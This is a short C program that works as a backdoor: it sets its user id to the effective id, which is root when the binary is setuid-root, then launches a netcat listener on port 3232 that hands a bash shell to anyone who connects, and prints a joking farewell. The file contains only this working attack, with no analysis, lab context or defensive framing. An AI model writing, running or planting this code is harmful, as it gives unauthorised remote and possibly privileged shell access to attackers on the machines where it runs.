#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main (){
  setuid(geteuid());
  system("nc -l -p 3232 -e /bin/bash &");
  system("echo So long, and thanks for all the fish. xD");
  return 0;
}
